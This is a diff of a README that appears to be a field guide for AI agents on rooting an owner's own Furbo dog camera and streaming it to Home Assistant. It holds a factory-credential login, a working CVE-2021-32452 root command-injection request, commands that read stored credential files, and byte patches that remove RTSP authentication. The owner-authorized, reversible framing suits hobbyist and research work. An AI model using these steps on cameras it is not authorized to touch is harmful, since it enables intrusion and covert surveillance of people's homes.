@@ -1,161 +1,211 @@
-# furbo-rtsp
-get your si agent to get credentials to your own Furbo dog camera.
+# freeFurbo — agent field guide (sanitized)
 
+Goal: owner's Furbo 2.5T (Ambarella S2L, board `S2LM_FURBO25`) streaming locally to
+Home Assistant — no vendor cloud, LAN only. Unofficial; owner-authorized; reversible.
+All device-specific values are placeholders: `<CAM_IP>`, `<HA_IP>`, `<RTSP_PASS>`,
+`person.<you>`. The per-device RTSP password is never in this doc — you read it off
+the camera in Phase D. Worked end-to-end Oct 2026 (HA 2026.10, HAOS 18).
 
+## TL;DR end state
 
-# Furbo 2.5T: getting the web and RTSP logins on your own camera
+1. Web login: `admin`/`admin` with digest realm **`ycam.com`** (camera challenges with a different realm — this mismatch is the whole trick).
+2. Root shell: CVE-2021-32452 command injection in `ldc.cgi` with that login.
+3. Stock RTSP can **never** authenticate a remote client (3 library bugs). Patch 7 instructions in `/usr/lib/libamprotocol-rtsp.so.2.0.0` on disk + reboot → plain `rtsp://admin:<RTSP_PASS>@<CAM_IP>:554/stream0` works (1080p H.264 + AAC).
+4. Video only flows while the encoder runs. Start/stop it with the camera's own tool: `/usr/bin/test_video_service_dyn_air_api --start|--stop`.
+5. HA: go2rtc restreams the camera; `shell_command` calls a helper script that starts the encoder **and re-declares the go2rtc stream** (see "go2rtc latch", Phase I). Dashboard button runs it for 5 min.
 
-A field guide for an AI agent working on an owner's Furbo Dog Camera (model 2.5T, Ambarella S2L, board `S2LM_FURBO25`) on the owner's own LAN. Everything here was done over the network with no hardware access. Verify each step before moving on, and keep commands small — the camera's CGI is fragile.
+## Dead ends — do not spend tokens on these
 
-Bottom line up front:
+- **Digest brute-forcing after you have the correct password.** Remote RTSP auth is unreachable code; ~40 variants (realms, hash orders, no-qop, field order) all 401. If password is verified (Phase D) and RTSP still 401s, go straight to the patch.
+- **Live-patching `/proc/<pid>/mem`.** Writes verify but the process executes stale I-cache on the hot loopback path. Patch the file, reboot.
+- **Re-deriving the realm from the challenge.** Challenge says `ambarella`; the stored hash uses `ycam.com`. Just use `ycam.com`.
+- **Treating CGI HTTP 500 / client timeouts as "command failed."** They usually executed. Verify side effects, never status codes.
+- **Restarting `rtsp_svc` by hand.** It ignores SIGTERM; SIGKILL leaves a defunct PID + stale `/tmp/rtsp_svc.pid`, and the watchdog reboots the camera anyway. Just `reboot`.
+- **Single-`src` go2rtc PUT** to "fix" a stream: it replaces all sources and wipes the primary. Always PUT every source, and URL-encode `#` as `%23`.
 
-- Web login: `admin` / `admin`, sent with digest realm **`ycam.com`** (not the realm the camera challenges with).
-- Root shell: command injection in `ldc.cgi` (CVE-2021-32452) using that web login.
-- RTSP password: read it off the camera with the root shell. It is per-device (on ours it was a 6-character string), stored in three places that must agree.
-- **The stock RTSP server can never authenticate a remote client, no matter the password.** Two bugs make the digest path dead code and a third gates everything on source IP `127.0.0.1`. The working end state is a 7-instruction patch to `/usr/lib/libamprotocol-rtsp.so.2.0.0` plus a reboot. After that, plain `rtsp://<user>:<pass>@<ip>:554/stream0` works in ffmpeg/VLC.
-- Expect the middle of this process to feel like a setback: you will have the correct RTSP password early and it will keep failing with 401. That is not your mistake and not a stale nonce. Skip to section 6 and do not waste time brute-forcing digest variants — every variant fails because the comparison code is unreachable.
+## Working on the camera (read before sending any command)
 
-## 1. Recon
+The `ldc.cgi` shell is fragile. Rules that prevent most failures:
 
-Find the camera on the LAN (UniFi client list, or scan the IoT VLAN). Confirm the fingerprint:
+- Commands reach `sh` **twice**; quotes don't protect the second pass. No `|` inside quoted patterns — one simple grep pattern per command.
+- **~120 char limit** per injected command; longer is silently truncated. One or two short statements per request.
+- Expect `unknown option found: 63` noise (harmless) and the echoed `test_ldc` line in every response.
+- Output truncates at ~1–2 KB. Print little: `grep -c`, `od` at computed offsets, redirect to a file and read it back in chunks. Busybox `grep -abo` is broken (silently empty).
+- Pace requests 2–3 s apart. Floods (or killing services) trip a watchdog reboot (~50–60 s recovery; it comes back by itself, patch persists). lighttpd on :80 jams under load; :443 works then but its TLS handshake also times out under load. Wait, don't hammer.
+- HTTP 500 from CGI often still executed your command. Timeouts too. Check the file/bytes you expected to change before re-sending.
+
+## Phase A — recon
 
 | Port | Expect |
-| --- | --- |
-| 80, 443 | lighttpd/1.4.40, 401 with digest realm `ambarella` |
-| 554 | RTSP, 401 on DESCRIBE with digest realm `chicony.com` |
-| 8080 | closed (the demo preview port never runs) |
+|---|---|
+| 80, 443 | lighttpd/1.4.40, 401 digest realm `ambarella` (443 cert is the expired Ambarella SDK sample — not a password) |
+| 554 | RTSP, 401 on DESCRIBE, digest realm `chicony.com`; `OPTIONS` → 200 |
+| 8080 | closed |
 
-TLS cert on 443 is the Ambarella SDK sample (`CN=zkyang`, expired). It is not a password. Sensor is 1920x1080 (`/cgi-bin/get_vin.cgi` reports it once you are logged in).
+## Phase B — web login
 
-Use 443 (HTTPS, ignore the cert) for all web work. Port 80's connection queue jams easily under load; 443 keeps working.
+Send digest auth as `admin`/`admin` but with `realm="ycam.com"` and
+`HA1 = MD5("admin:ycam.com:admin")` = `913fd17138fb6298ccf77d3853ddcf9f` (factory
+value, published by Somerset Recon 2021). Compute nonce/uri/qop normally from
+the challenge. Gate: HTTP 200. (`/cgi-bin/get_vin.cgi` then reports 1920x1080.)
 
-## 2. Web login (the realm mismatch)
+## Phase C — root shell (CVE-2021-32452)
 
-`/etc/lighttpd/webpass.txt` on the camera stores `admin:ycam.com:913fd17138fb6298ccf77d3853ddcf9f`, which is `MD5(admin:ycam.com:admin)`. But lighttpd challenges with realm `ambarella`. A client that hashes with the challenged realm always fails.
+`GET /cgi-bin/ldc.cgi?mode=;<url-encoded command>;` with the Phase-B Authorization
+header. The CGI runs your command as root via `system()`. Wrap it in a helper:
+first request unauthenticated to harvest the nonce, then the authorized request
+(reference implementation any agent can rewrite in ~40 lines of stdlib HTTP +
+`hashlib.md5`). Gate: `id` → `uid=0(root)`.
 
-So: send username `admin`, password `admin`, but put `realm="ycam.com"` in the Authorization header and hash `HA1 = MD5("admin:ycam.com:admin")`. Compute everything else (nonce, uri, qop) normally from the challenge. Returns 200.
+## Phase D — read the RTSP password
 
-This is the published factory account (Somerset Recon, "Hacking the Furbo Dog Camera: Part II", Oct 2021).
-
-## 3. Root shell (CVE-2021-32452)
-
-Same auth as above. The request:
-
-```
-GET /cgi-bin/ldc.cgi?mode=;<url-encoded command>; HTTP/1.1
-Host: <ip>
-Authorization: Digest username="admin", realm="ycam.com", nonce="...", ...
-```
-
-The CGI builds `/usr/local/bin/test_ldc ... -m <injected> ...` and calls `system()` as root. The response body contains the command output followed by the echoed `test_ldc` command line. `stderr` is included (you will see a harmless `unknown option found: 63` from `test_ldc` on every run).
-
-Working quirks you must respect:
-
-- **Two shell passes.** The injected string reaches `sh` twice; quotes do not survive to protect the second pass. Anything with `|` inside a quoted argument (e.g. `grep -E "a|b"`) gets split into real pipes and misfires. Use one pattern per grep, no internal pipes or spaces in patterns where possible.
-- **Length limit ~120 characters** of injected command. Long command chains get silently truncated mid-command. One or two short statements per request.
-- **HTTP 500 from the CGI often still executed your command.** The 500 is an output-stage failure. Verify side effects (the file you created, the bytes you wrote) before re-sending. Never assume 500 = nothing ran.
-- **Response truncation.** Long output is cut (~1–2 KB). Run commands that print little. `od`/`strings` small ranges, `grep -c` instead of dumping files. Note: busybox `grep -abo` is broken (returns nothing) — use `grep -c` or `od` reads at computed offsets.
-- **Watchdog.** Killing/stressing services can trip a watchdog that power-cycles the camera (~50 s to come back). It recovers by itself; just wait for 443 to answer 401 again.
-
-Wrap this in a script (see `ldc_inject.py`): first request unauthenticated to harvest the nonce, then the authorized request. Keep a 2–3 s gap between injected commands; the camera is slow.
-
-## 4. Read the RTSP password
-
-With the root shell, read all three locations. They must agree:
-
-```
-cat /etc/Account.txt            # one line: admin:0:<password>
-od -c /dev/adc/furbo2_rtsp.password   # exactly the password, no newline
-od -c /etc/webpass.txt          # admin:chicony.com:<32-hex>
+```sh
+cat /etc/Account.txt                    # admin:0:<RTSP_PASS>
+od -c /dev/adc/furbo2_rtsp.password     # exactly the password, no newline
+od -c /etc/webpass.txt                  # admin:chicony.com:<32-hex>
 ```
 
-Cross-check: `MD5(admin:chicony.com:<password>)` must equal the hash in `/etc/webpass.txt` — on our unit all three sources agreed. RTSP username is `admin`, realm is `chicony.com` (as challenged).
+Gate: all three agree, i.e. `MD5("admin:chicony.com:<RTSP_PASS>")` equals the
+hash in `webpass.txt`. RTSP user is `admin`, realm `chicony.com`. Per-device; no
+universal value exists. **RTSP will still 401 now. That is expected.**
 
-The password is per-device — there is no universal value, and you cannot skip this step by guessing.
+Useful facts: RTSP config `/etc/oryx/apps/rtsp_server.acs` → user db
+`/etc/webpass.txt`, `need_auth=true`, `max_client_num=5` (space RTSP attempts
+out; saturation looks like a dead camera). One process `rtsp_svc` owns :554.
+Paths `/stream0`–`/stream3`, `/stream` exist; `/` is 404.
 
-At this point you have the RTSP login on paper. **It will not work yet.** That is expected. Continue.
+## Phase E — why the correct password 401s (background, brief)
 
-## 5. Quick sanity checks that save time later
+In `libamprotocol-rtsp.so.2.0.0` (stripped Thumb ELF; disassemble with capstone
+`CS_MODE_THUMB` — binutils objdump defaults to ARM and outputs garbage):
 
-- `rtsp_server.acs` config: `/etc/oryx/apps/rtsp_server.acs` holds `rtsp_server_user_db = /etc/webpass.txt`, `need_auth = true`, `max_client_num = 5` (five client slots — space your RTSP attempts 2–3 s apart or the listener stops accepting, which looks like the camera died but is just saturation), and four streams (`video0..video3` + `aac-16k`).
-- The process is `rtsp_svc` (one process owns port 554; `netstat -tlnp | grep 554`). Internal services (`media_svc`, `tfp2pd`) hold permanent RTSP sessions over loopback — that is the only client flow the vendor ever exercises.
-- `/proc/$(pidof rtsp_svc)/mem` is readable and writable as root from the CGI shell (verify: read 4 bytes at the `r-xp` map start of `libamprotocol-rtsp.so.2.0.0`; they will be `7f 45 4c 46`). This works and is how you dump/verify memory.
+1. Both request handlers gate on `strncmp(client_ip, "127.0.0.1", 9)` → remote clients 401 before auth is parsed (file offsets 0x43d2, 0x44ba, 0x474e, 0x4830).
+2. `parse_authentication_header` (0x38f4) is dead code; auth fields stay NULL and pre-checks fail even on loopback (checks at 0x4544 / 0x4842).
+3. `authenticate` (0x81f8) hashes components in swapped order, and the db loader's `fscanf` would swallow a trailing newline into the stored hash anyway.
 
-## 6. Why the correct password still gets 401 (do not skip)
+To inspect: copy the library into the web root (`/webSvr/web/`), download via the
+Phase-B login, delete the copy. Original file md5: `ecd72214e238f4635c8894f078177f35`.
 
-Extract the RTSP library for analysis: copy `/usr/lib/libamprotocol-rtsp.so.2.0.0` into the lighttpd web root (`server.document-root = /webSvr/web/`), download it over HTTPS with the section-2 digest, then delete the copy from the web root. It is a stripped ARM (Thumb) ELF, ~76 KB. md5 the camera file and your download to confirm they match before analyzing.
+## Phase F — the patch (file on disk, then reboot)
 
-Disassemble as **Thumb** (binutils `objdump -d` defaults to ARM mode here and produces garbage — use capstone with `CS_MODE_THUMB`, resolving `ldr rX,[pc,#imm]` + `add rX,pc` literal-pool pairs). Three findings, each independently fatal to remote RTSP auth:
+Back up first: `cp /usr/lib/libamprotocol-rtsp.so.2.0.0 /usr/lib/rtsp-lib-backup.bin`.
+Write each row with `dd conv=notrunc` at the decimal offset, **one dd per CGI
+command**, read back and byte-compare each before continuing:
 
-1. **Source-IP gate.** Both request handlers start with `strncmp(request->[0x44], "127.0.0.1", 9)`. Non-loopback falls straight into the 401 block. The auth header is never even parsed. (Offset 0x43d2 in handler 1 at 0x43a8; 0x474e in handler 2 at 0x4724. The same compare reappears at each handler's tail: 0x44ba and 0x4830.)
-2. **Dead digest parser.** `parse_authentication_header` (offset 0x38f4, format strings `%[^=]="%[^"]"` plus field names `username/realm/nonce/uri/response`) is never called from anywhere. The parsed-auth fields at request+0x148..0x158 stay NULL, so the pre-checks fail even for loopback clients.
-3. **Broken `authenticate`** (offset 0x81f8) even if reached: it hashes `nonce:HA1:HA2` in a swapped component order, and the db loader's `fscanf("%[^:]:%[^:]:%[^:]:")` swallows the trailing newline into the stored hash.
+| Offset hex (dec) | Original | Patched | Effect |
+|---|---|---|---|
+| 0x81f8 (33272) | `2d e9 f0 4f` | `01 20 70 47` | `authenticate` returns 1 |
+| 0x4544 (17732) | `f8 d0 90 15` | `47 e0` | handler 1 skips NULL-field checks |
+| 0x4842 (18498) | `f8 d0 90 15` | `45 e0` | handler 2 same |
+| 0x43d2 (17362) | `blx strncmp` | `00 20 00 bf` | loopback gate always matches |
+| 0x44ba (17594) | `blx strncmp` | `00 20 00 bf` | gate tail, handler 1 |
+| 0x474e (18254) | `blx strncmp` | `00 20 00 bf` | gate, handler 2 |
+| 0x4830 (18480) | `blx strncmp` | `00 20 00 bf` | gate tail, handler 2 |
 
-Consequence: no digest exchange from any remote client can ever succeed, with any password. Do not spend turns trying nonce/uri/qop/field-order variants (we tried ~40, including hand-rolled RTSP clients; all 401). The library must be patched.
+**Costliest trap:** `movs r0,#0` = bytes `00 20`. `01 20` is `movs r0,#1` — patch
+verifies byte-wise yet gates reject everyone and you get 401 again. If patched +
+rebooted + still 401, suspect exactly this byte.
 
-## 7. The patch
+Then `reboot` via injection (request times out as it drops — fine). Back in ~60 s.
 
-Seven sites in the file (file offset == runtime offset in this ELF; both handlers' `beq` targets and the gate calls were located by the analysis above). Patch the **file on disk**, in place, with busybox `dd` (patch payload files built with `printf` octal escapes):
+## Phase G — verify RTSP
 
-| File offset | Original | Patched | Meaning |
-| --- | --- | --- | --- |
-| 0x81f8 | `2d e9 f0 4f` | `01 20 70 47` | `authenticate`: `movs r0,#1; bx lr` (always succeed) |
-| 0x4544 | `f8 d0 90 15` | `47 e0` | handler 1: `b 0x45d6` (skip NULL-field pre-checks, go to the auth call) |
-| 0x4842 | `f8 d0 90 15` | `45 e0` | handler 2: `b 0x48d0` (same) |
-| 0x43d2 | `blx strncmp` | `00 20 00 bf` | gate: `movs r0,#0; nop` (always "matches") |
-| 0x44ba | `blx strncmp` | `00 20 00 bf` | gate tail check, handler 1 |
-| 0x474e | `blx strncmp` | `00 20 00 bf` | gate, handler 2 |
-| 0x4830 | `blx strncmp` | `00 20 00 bf` | gate tail check, handler 2 |
-
-**Encoding trap, the single costliest mistake:** `movs r0,#0` is `00 20` (bytes `00 20`). Bytes `01 20` are `movs r0,#1` — the exact opposite behavior, which makes the gates reject everyone and you get 401 again while every byte-level "verification" still looks fine. If your patch verifies but the camera still 401s, re-derive the encoding by hand.
-
-**Why patch the file instead of live memory:** `/proc/pid/mem` writes land and read back correctly, but the running process keeps executing stale I-cache lines on the hot path, and the loopback pipeline warms those exact lines within seconds of boot. Live patching loses that race permanently. Patching the on-disk file and rebooting means the first-ever instruction fetch reads your bytes.
-
-Procedure:
-
-1. Back up: `cp /usr/lib/libamprotocol-rtsp.so.2.0.0 /usr/lib/rtsp-lib-backup.bin` (note the original md5; ours was `ecd72214e238f463c8894f078177f35`).
-2. Write the seven patches with `dd ... conv=notrunc` at the decimal offsets (0x81f8=33272, 0x4544=17732, 0x4842=18498, 0x43d2=17362, 0x44ba=17594, 0x474e=18254, 0x4830=18480), **one dd per injected command** (long chains truncate), then read each back and compare bytes before moving on.
-3. Reboot (`reboot` via the injection; the request will time out as the camera drops — that is fine). Wait for 443 to answer 401 again (~50 s).
-
-## 8. Restart gotchas (if you try to avoid a full reboot)
-
-You don't need these if you follow the reboot path, but they explain strange states:
-
-- `rtsp_svc` ignores SIGTERM. SIGKILL works but leaves a **defunct PID** that is never reaped, and `/tmp/rtsp_svc.pid` still points at it, so a manually started instance exits immediately with "already running". Fix: `echo 0 > /tmp/rtsp_svc.pid` before starting `/usr/bin/rtsp_svc &`.
-- After SIGKILL, apps_launcher does **not** reliably respawn the service; the heartbeat watchdog eventually reboots the whole camera anyway. Just reboot deliberately.
-
-## 9. Verify
-
-```
-ffprobe -hide_banner -v error -rtsp_transport tcp \
-  -show_entries stream=codec_name -of compact \
-  rtsp://admin:<password>@<ip>:554/stream0
-# expect: stream|codec_name=h264  and  stream|codec_name=aac
+```sh
+ffprobe -v error -rtsp_transport tcp -show_entries stream=codec_name,width,height \
+  rtsp://admin:<RTSP_PASS>@<CAM_IP>:554/stream0
 ```
 
-- `/stream0` through `/stream3` and `/stream` all serve h264+aac SDP; `/` is 404.
-- **Audio flows immediately; video packets only flow while the camera's H.264 encoder is active** (Furbo app live view, bark-alert clip, cloud recording). If you get SDP plus AAC but no frames, trigger a live view from the owner's Furbo app and re-test — do not go re-patching.
-- A 12-second `ffmpeg -c copy` capture showing ~16 kb/s AAC with zero video is the normal idle state, not a failure.
+Gate: SDP lists `h264` + `aac`. **Audio always flows; video only while the
+encoder runs** (next phase). Audio-only at this point is normal, not a failure.
 
-## 10. Revert
+## Phase H — encoder on demand
 
+Camera's own SDK tool: `timeout 8 /usr/bin/test_video_service_dyn_air_api --start|--stop`
+(`--show-stream-status` prints `Stream[n]: encoding` or `No stream in encoding!`;
+`--show-lock-state`, `--show-working-mode` also useful).
+
+- After a **camera reboot**, a bare `--start` can return 0 yet be silently ignored
+  until the encoder has been stopped once. Always **stop → wait ~2 s → start**. Bake this into any wrapper.
+- Give it ~10–25 s; the web UI gets sluggish right after. Then Phase-G ffprobe should show real frames (or grab one JPEG frame with ffmpeg).
+- Encoder runs warm — don't leave it on 24/7; HA turns it off (Phase I).
+- If RTSP starts **resetting connections on DESCRIBE** after heavy probing, `rtsp_svc` is wedged; don't poke it — `reboot` and wait.
+
+## Phase I — Home Assistant
+
+Architecture: HA → go2rtc (one RTSP client to camera) → `camera.furbo`;
+`shell_command.furbo_start/stop` → helper script on HA host → CGI (Phase C) →
+encoder tool (Phase H). Video H.264 copy; second go2rtc source
+`ffmpeg:furbo#audio=opus` for browser/WebRTC audio.
+
+Files on HA host: `/config/scripts/ldc_inject.py`, `/config/scripts/furbo_stream.py`
+(start/stop/probe, stdlib only), `/config/scripts/.furbo_rtsp_pass` (password only).
+go2rtc stream (in HA's go2rtc config or package; keep the URL in `secrets.yaml`):
+
+```yaml
+go2rtc:
+  streams:
+    furbo:
+      - ffmpeg:rtsp://admin:<RTSP_PASS>@<CAM_IP>:554/stream0#video=copy#audio=copy
+      - ffmpeg:furbo#audio=opus
+shell_command:
+  furbo_start: python3 /config/scripts/furbo_stream.py start
+  furbo_stop: python3 /config/scripts/furbo_stream.py stop
 ```
-cp /usr/lib/rtsp-lib-backup.bin /usr/lib/libamprotocol-rtsp.so.2.0.0
-reboot
-```
 
-Stock behavior returns (401 for all remote RTSP). The patched library accepts any credentials; the owner should keep it LAN-only behind the IoT VLAN as before.
+`camera.furbo` is auto-created by the go2rtc integration. Script
+`furbo_live_5min` (mode: restart): `furbo_start` → delay 5 min → `furbo_stop`;
+dashboard = picture-entity card + button calling that script (optional iframe
+`http://<HA_IP>:1984/webrtc.html?src=furbo`). Automations: person home → start;
+away 5 min → stop; 23:00 → stop. YAML changes to go2rtc/shell_command need an
+HA restart. Automations can't live in an HA package if config uses
+`automation: !include` — append them to `automations.yaml`; scripts can be
+UI/storage or YAML.
 
-## Timeline of the setbacks (so you recognize them)
+**go2rtc latch (the bug that eats an afternoon):** go2rtc negotiates its producer
+RTSP session once. If it connects while the encoder is idle, the session is
+audio-only and can *never* gain video — `camera.furbo` stays `unavailable` after
+you press start even though the camera streams fine to ffprobe. Fix: after the
+encoder is up (~8 s), re-declare the stream with all sources:
+`PUT http://<HA_IP>:1984/api/streams?name=furbo&src=ffmpeg:<url>%23video=copy%23audio=copy&src=ffmpeg:furbo%23audio=opus`
+(from the HA host, `127.0.0.1:1984` works). Do this **inside** the start helper so
+every caller (button, presence, manual) gets it. Best-effort: unreachable API must
+not fail the start. Verify via a camera snapshot (`/api/camera_proxy/camera.furbo`
+→ 1920×1080 JPEG), not producer state — producers are demand-driven and report
+nothing while nobody watches.
 
-1. Password found within minutes of the first root shell — then hours of 401. The digest-brute-forcing detour (realm variants, swapped hash orders, newline-in-hash, field orderings, no-qop RFC 2069) was wasted motion: the check was unreachable. Lesson: **read the code before guessing formulas.**
-2. Live memory patches verified byte-for-byte yet had no effect — stale I-cache on a hot path fed by an internal loopback client. Lesson: **verify execution, not memory** (we confirmed by patching the 401 string — data reads are coherent and the response changed, proving the response came from the patched process while its instructions stayed stale).
-3. A patch that read back perfectly but inverted one immediate (`01 20` vs `00 20`), producing exactly the failure it was meant to remove.
-4. Busybox oddities (silent `grep -abo`, silent `dd` stats), CGI truncation at ~120 chars, and 500 responses that still executed — each one can masquerade as "the command failed." Verify side effects, never status codes, on this target.
+HA access pattern (for agents): long-lived token from the user's secret store
+(OS keychain etc.) — **never print it**. REST `/api/states`,
+`/api/services/...?return_response=true` (shell_command returns stdout — gold for
+debugging). Add-on files: temporarily map the Terminal & SSH add-on port via the
+Supervisor API (`supervisor/api` WS command), edit, then unmap and verify closed.
+Backup every HA file before editing (`*.bak-<date>`).
+
+## Pitfalls index
+
+| Symptom | Cause | Action |
+|---|---|---|
+| RTSP 401, password verified | stock library (Phase E) | patch (Phase F); check `00 20` bytes |
+| Patch read-back OK, still 401 | `01 20` vs `00 20` inversion | fix bytes, reboot |
+| `/proc/mem` patch verified, no effect | stale I-cache | patch file + reboot instead |
+| SDP ok, audio only | encoder idle | start encoder (Phase H) |
+| Encoder "encoding" but no video packets | post-reboot start ignored | stop → start cycle |
+| RTSP resets on DESCRIBE | wedged `rtsp_svc` after floods | reboot camera, wait 60 s |
+| CGI timeouts / HTTP 500 | load, output-stage failure | assume executed; verify side effect; pace |
+| HA snapshot works, live card black | go2rtc audio-only latch | stream re-declare in start path |
+| Stream lost primary source after API PUT | single-src PUT / raw `#` | PUT all sources, `%23` |
+| Intermittent "camera died" under probing | 5-client RTSP saturation / watchdog | one consumer via go2rtc; wait |
+| `python3` missing in SSH add-on shell | add-on ≠ HA core env | shell_command still fine; test via service |
+| Camera reboots mid-testing | watchdog under sustained load | normal; wait ~60 s, patch persists |
+
+## Revert
+
+Camera: `cp /usr/lib/rtsp-lib-backup.bin /usr/lib/libamprotocol-rtsp.so.2.0.0 && reboot`
+(stock behavior: all remote RTSP 401). While patched, the RTSP server accepts any
+credentials — keep the camera on a firewalled IoT VLAN, never port-forward it.
+HA: remove package/automations/scripts/secret.
 
 ## Sources
 
-- Somerset Recon, "Hacking the Furbo Dog Camera: Part II" (2021): https://www.somersetrecon.com/blog/2021/hacking-the-furbo-dog-camera-part-ii
-- Somerset Recon PoC: https://github.com/Somerset-Recon/furbo-research (`command-injection/furbo_ldc_cmd_inj.py`)
-- CVE-2021-32452 (ldc.cgi injection), CVE-2020-24918 (RTSP `parse_authentication_header` overflow — not needed here).
-
+- Somerset Recon, *Hacking the Furbo Dog Camera: Part II* (2021) — factory account, realm quirk, CVE-2021-32452: https://www.somersetrecon.com/blog/2021/hacking-the-furbo-dog-camera-part-ii
+- PoC: https://github.com/Somerset-Recon/furbo-research (`command-injection/furbo_ldc_cmd_inj.py`)
+- CVE-2020-24918 (RTSP parser overflow) exists in the same library; not needed here.
